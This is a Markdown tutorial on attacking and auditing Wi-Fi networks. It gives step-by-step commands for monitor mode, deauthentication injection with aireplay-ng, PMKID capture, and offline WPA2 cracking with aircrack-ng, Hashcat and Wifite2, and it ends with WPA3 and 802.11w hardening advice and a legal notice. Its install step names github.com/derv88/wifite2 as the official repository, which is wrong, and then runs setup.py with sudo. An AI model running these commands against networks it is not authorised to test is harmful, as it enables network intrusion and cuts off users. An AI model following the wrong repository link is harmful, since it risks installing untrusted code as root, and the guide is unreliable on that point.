# Aircrack-ng & Wifite2 — Complete Wi-Fi Security Auditing Guide

A complete, production-grade guide to **Aircrack-ng** (`aircrack-ng`) and **Wifite2** (`wifite`), the industry-standard 802.11 wireless security auditing toolchain, covering monitor mode setup, packet injection, WPA2 4-way handshake interception, modern PMKID extraction, automated rogue AP auditing, and handoff to Hashcat.

---

## 📑 Table of Contents

- [1. Overview & 802.11 Wireless Security Architecture](#1-overview-80211-wireless-security-architecture)
  - [WPA2 4-Way Handshake vs Modern PMKID Attacks](#wpa2-4-way-handshake-vs-modern-pmkid-attacks)
  - [The Aircrack-ng Modular Toolchain Breakdown](#the-aircrack-ng-modular-toolchain-breakdown)
- [2. Installation & Hardware Requirements](#2-installation-hardware-requirements)
  - [Wireless Adapter Chipsets (Packet Injection Support)](#wireless-adapter-chipsets-packet-injection-support)
  - [Installing Aircrack-ng via Homebrew (macOS)](#installing-aircrack-ng-via-homebrew-macos)
  - [Installing on Linux & Driver Configuration](#installing-on-linux-driver-configuration)
  - [Installing Wifite2](#installing-wifite2)
- [3. Enabling Monitor Mode & Packet Capture](#3-enabling-monitor-mode-packet-capture)
  - [Enabling Monitor Mode with airmon-ng](#enabling-monitor-mode-with-airmon-ng)
  - [Surveying Airwaves with airodump-ng](#surveying-airwaves-with-airodump-ng)
  - [Targeting Specific BSSIDs and Channels](#targeting-specific-bssids-and-channels)
- [4. WPA2 Handshake Capture & Deauthentication](#4-wpa2-handshake-capture-deauthentication)
  - [Deauthenticating Clients with aireplay-ng](#deauthenticating-clients-with-aireplay-ng)
  - [Verifying Handshake Capture in PCAP Files](#verifying-handshake-capture-in-pcap-files)
- [5. Clientless PMKID Extraction (Modern Attack)](#5-clientless-pmkid-extraction-modern-attack)
  - [Why PMKID Does Not Require Connected Clients](#why-pmkid-does-not-require-connected-clients)
  - [Capturing PMKIDs with hcxdumptool](#capturing-pmkids-with-hcxdumptool)
  - [Converting PCAPNG to Hashcat Mode 22000](#converting-pcapng-to-hashcat-mode-22000)
- [6. Offline Cracking Workflows](#6-offline-cracking-workflows)
  - [Cracking Handshakes with aircrack-ng](#cracking-handshakes-with-aircrack-ng)
  - [GPU Acceleration Handoff to Hashcat (Mode 22000)](#gpu-acceleration-handoff-to-hashcat-mode-22000)
- [7. Automated Auditing with Wifite2](#7-automated-auditing-with-wifite2)
  - [One-Command Wi-Fi Penetration Testing](#one-command-wi-fi-penetration-testing)
  - [WPS Pixie-Dust & WPA3 Fallback Audits](#wps-pixie-dust-wpa3-fallback-audits)
- [8. Defensive Hardening & Mitigation](#8-defensive-hardening-mitigation)
  - [Migrating to WPA3-Personal (SAE) & WPA3-Enterprise](#migrating-to-wpa3-personal-sae-wpa3-enterprise)
  - [Protected Management Frames (802.11w PMF)](#protected-management-frames-80211w-pmf)
- [9. Quick Reference Cheat Sheet & FAQ](#9-quick-reference-cheat-sheet-faq)
  - [CLI Commands Summary Table](#cli-commands-summary-table)
  - [Troubleshooting & Common Pitfalls](#troubleshooting-common-pitfalls)

---

## 1. Overview & 802.11 Wireless Security Architecture

### WPA2 4-Way Handshake vs Modern PMKID Attacks

Wireless networks protected by WPA2-PSK rely on the **Pre-Shared Key (PSK)** to derive the **Pairwise Master Key (PMK)**.

Traditional audits captured the **4-Way Handshake** exchanged between the Access Point (AP) and a client when authenticating:
1. Message 1: AP sends ANonce (Access Point Random Nonce).
2. Message 2: Client computes SNonce and MIC (Message Integrity Code), sending them back.
3. Message 3: AP sends GTK (Group Temporal Key).
4. Message 4: Client acknowledges.

Capturing Messages 1 and 2 allows an auditor to perform offline dictionary attacks to verify if a candidate password produces a matching MIC.

**Modern PMKID Attack (2018+)**:
Discovered by Hashcat creator Jens Steube, modern 802.11i/r networks include the **Pairwise Master Key Identifier (PMKID)** inside the first EAPOL frame sent directly by the router. This means an auditor can harvest crackable authentication data **without any clients connected to the network** and without sending deauthentication packets!

```
┌─────────────────────────────────────────────────────────────┐
│                 Wireless Attack Comparison                  │
├──────────────────────────────┬──────────────────────────────┤
│    WPA2 4-Way Handshake      │      Modern PMKID Attack     │
├──────────────────────────────┼──────────────────────────────┤
│ • Requires connected client  │ • Clientless (Direct AP)     │
│ • Requires deauth injection  │ • Passive request to AP      │
│ • Needs 2-4 EAPOL frames     │ • Single EAPOL frame         │
│ • Prone to frame drops       │ • Highly reliable            │
│ • Captured via airodump-ng   │ • Captured via hcxdumptool   │
└──────────────────────────────┴──────────────────────────────┘
```

### The Aircrack-ng Modular Toolchain Breakdown

Aircrack-ng consists of specialized sub-programs:
- `airmon-ng`: Manages wireless interface monitor mode and terminates conflicting OS processes.
- `airodump-ng`: Captures 802.11 raw frames, displaying AP channels, signal strength, and connected clients.
- `aireplay-ng`: Injects crafted 802.11 frames (deauthentication, ARP replay, beacon floods).
- `aircrack-ng`: Multi-threaded CPU dictionary cracking engine for WEP/WPA/WPA2 keys.

---

## 2. Installation & Hardware Requirements

### Wireless Adapter Chipsets (Packet Injection Support)

Capturing 802.11 frames and sending injection packets requires a compatible external USB Wi-Fi adapter supporting **Monitor Mode** and **Frame Injection**:
- **Atheros AR9271** (e.g., Alfa AWUS036NHA - 2.4 GHz)
- **MediaTek MT7612U** (e.g., Alfa AWUS036ACM - Dual-Band 2.4 / 5 GHz)
- **Ralink RT3070 / RT3572**
- **Realtek RTL8812AU / RTL8814AU** (Requires DKMS driver)

### Installing Aircrack-ng via Homebrew (macOS)

On macOS, Aircrack-ng provides offline capture analysis and dictionary cracking tools:

```bash
# Install Aircrack-ng via Homebrew
brew install aircrack-ng

# Verify binaries
aircrack-ng --help
```

> [!NOTE]
> macOS built-in Wi-Fi hardware (`en0`) does not support 802.11 frame injection. For active frame injection and deauthentication, run Aircrack-ng inside a Linux virtual machine or bootable Kali/Parrot OS with a compatible external USB Wi-Fi adapter.

### Installing on Linux & Driver Configuration

```bash
# Ubuntu / Debian / Kali Linux
sudo apt-get update
sudo apt-get install -y aircrack-ng hcxdumptool hcxtools
```

### Installing Wifite2

Wifite2 is an automated Python 3 wrapper that orchestrates the entire Aircrack, Reaver, and hcxdumptool suite:

```bash
# Clone Wifite2 from official repository
git clone https://github.com/derv88/wifite2.git
cd wifite2
sudo python3 setup.py install
```

---

## 3. Enabling Monitor Mode & Packet Capture

### Enabling Monitor Mode with airmon-ng

Before capturing raw wireless frames, put the wireless interface into monitor mode and stop interference from `NetworkManager`:

```bash
# 1. Terminate conflicting processes
sudo airmon-ng check kill

# 2. Enable monitor mode on interface (e.g. wlan0)
sudo airmon-ng start wlan0
```

The interface transforms into `wlan0mon`.

### Surveying Airwaves with airodump-ng

Scan all 2.4 GHz and 5 GHz wireless channels to discover surrounding Access Points:

```bash
# Start general airwaves scan
sudo airodump-ng wlan0mon
```

Columns displayed:
- `BSSID`: MAC address of the Access Point.
- `PWR`: Signal strength (higher is better, e.g. -45 dBm).
- `CH`: Operational Wi-Fi channel (1–14 for 2.4 GHz; 36–165 for 5 GHz).
- `ENC`: Encryption algorithm (`WPA2`, `WPA3`, `WEP`, `OPEN`).
- `AUTH`: Authentication suite (`PSK`, `MGT`, `SAE`).
- `ESSID`: Broadcast network name (SSID).

### Targeting Specific BSSIDs and Channels

Lock capture onto a single target router:

```bash
# Lock channel and write packets to capture file
sudo airodump-ng \
  --bssid AA:BB:CC:DD:EE:FF \
  --channel 6 \
  --write corp_wifi \
  wlan0mon
```

Airodump creates `corp_wifi-01.cap`.

---

## 4. WPA2 Handshake Capture & Deauthentication

### Deauthenticating Clients with aireplay-ng

While `airodump-ng` is actively recording packets, send a brief burst of deauthentication frames to force a connected client to reconnect and perform the 4-way handshake:

```bash
# Send 5 deauth packets to a specific client connected to the target AP
sudo aireplay-ng \
  --deauth 5 \
  -a AA:BB:CC:DD:EE:FF \
  -c 11:22:33:44:55:66 \
  wlan0mon
```

Parameters:
- `-a`: BSSID of the Access Point.
- `-c`: MAC address of the connected client station.
- `--deauth 5`: Number of deauthentication frames to inject.

### Verifying Handshake Capture in PCAP Files

In the top right corner of the active `airodump-ng` terminal, verify the handshake banner:

```text
[ WPA handshake: AA:BB:CC:DD:EE:FF
```

Alternatively, verify using `aircrack-ng`:

```bash
aircrack-ng corp_wifi-01.cap
```

The output will indicate `1 handshake` for the target BSSID.

---

## 5. Clientless PMKID Extraction (Modern Attack)

### Why PMKID Does Not Require Connected Clients

The **PMKID** is calculated as:
```text
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```

Because the router derives this identifier as part of the Roaming/Key Exchange mechanism, an auditor only needs to send an Association Request to the AP. The AP replies with the PMKID in EAPOL frame 1—no connected clients or deauthentication required.

### Capturing PMKIDs with hcxdumptool

```bash
# Capture PMKID directly from target access point
sudo hcxdumptool \
  -i wlan0mon \
  -o target_pmkid.pcapng \
  --enable_status=1
```

### Converting PCAPNG to Hashcat Mode 22000

Convert captured packets into Hashcat's modern consolidated format (`22000`):

```bash
# Convert pcapng to hashcat mode 22000 hash string
hcxpcapngtool -o target.22000 target_pmkid.pcapng
```

---

## 6. Offline Cracking Workflows

### Cracking Handshakes with aircrack-ng

Run a dictionary attack against captured handshakes using the CPU engine:

```bash
# Dictionary attack using rockyou wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF corp_wifi-01.cap
```

### GPU Acceleration Handoff to Hashcat (Mode 22000)

For high-speed cracking, convert the `.cap` handshake to Hashcat format:

```bash
# Convert cap to hashcat 22000
hcxpcapngtool -o hash.22000 corp_wifi-01.cap

# Launch GPU cracking attack with rules
hashcat -m 22000 -a 0 hash.22000 /usr/share/wordlists/rockyou.txt -r /opt/homebrew/share/hashcat/rules/best64.rule
```

---

## 7. Automated Auditing with Wifite2

### One-Command Wi-Fi Penetration Testing

**Wifite2** automates target discovery, monitor mode switching, PMKID capture, client deauth, and handshake verification in an interactive terminal menu:

```bash
# Launch interactive Wifite2 audit
sudo wifite
```

Key options:
- `--pmkid`: Only audit clientless PMKID vulnerabilities.
- `--wpa`: Restrict scan strictly to WPA/WPA2 networks.
- `--dict /path/to/wordlist.txt`: Automatically run cracking after handshake capture.

```bash
sudo wifite --wpa --pmkid --dict /usr/share/wordlists/rockyou.txt
```

### WPS Pixie-Dust & WPA3 Fallback Audits

Wifite also checks for legacy **WPS (Wi-Fi Protected Setup)** PIN vulnerabilities using `reaver` and `bully`, allowing instantaneous key recovery on unpatched routers:

```bash
sudo wifite --wps-only
```

---

## 8. Defensive Hardening & Mitigation

### Migrating to WPA3-Personal (SAE) & WPA3-Enterprise

1. **WPA3 Simultaneous Authentication of Equals (SAE)**: Replaces the 4-way PSK handshake with Dragonfly key exchange, which is resistant to offline dictionary attacks even if raw frames are recorded.
2. **Eliminate Legacy Fallbacks**: Disable "WPA2/WPA3 Mixed Mode" on networks carrying sensitive data, as attackers can force devices to fall back to WPA2.

### Protected Management Frames (802.11w PMF)

Enable **802.11w Protected Management Frames (PMF)** on routers:
- Encrypts and cryptographically signs deauthentication and disassociation frames.
- Renders `aireplay-ng --deauth` completely ineffective, preventing attackers from kicking clients off the network.

---

## 9. Quick Reference Cheat Sheet & FAQ

### CLI Commands Summary Table

| Action | Command Syntax |
| :--- | :--- |
| **Start Monitor Mode** | `sudo airmon-ng start wlan0` |
| **Stop Monitor Mode** | `sudo airmon-ng stop wlan0mon` |
| **Scan All APs** | `sudo airodump-ng wlan0mon` |
| **Target Single AP** | `sudo airodump-ng --bssid MAC -c CH -w out wlan0mon` |
| **Inject Deauth Packets** | `sudo aireplay-ng --deauth 5 -a AP_MAC -c CLIENT_MAC wlan0mon` |
| **Verify Handshake** | `aircrack-ng out-01.cap` |
| **CPU Wordlist Crack** | `aircrack-ng -w wordlist.txt -b AP_MAC out-01.cap` |
| **Convert to Hashcat** | `hcxpcapngtool -o hash.22000 out-01.cap` |
| **GPU Crack (Hashcat)**| `hashcat -m 22000 hash.22000 wordlist.txt` |
| **Automated Wifite Run**| `sudo wifite --wpa --pmkid` |

### Troubleshooting & Common Pitfalls

> [!NOTE]
> **No handshakes captured**: Ensure you are geographically close enough to both the router and client station. Deauthentication packets must reach the client, and the client's reconnect response must reach your antenna.

> [!TIP]
> **Channel Hopping Interference**: If airodump hops channels while targeting, always specify `--channel N` to lock your adapter to the target AP's exact frequency.

> [!IMPORTANT]
> **Legal Notice**: Intercepting wireless communications and transmitting 802.11 deauthentication frames against networks you do not own is illegal under telecommunications laws (such as the US CFAA and FCC regulations). Always obtain written authorization.
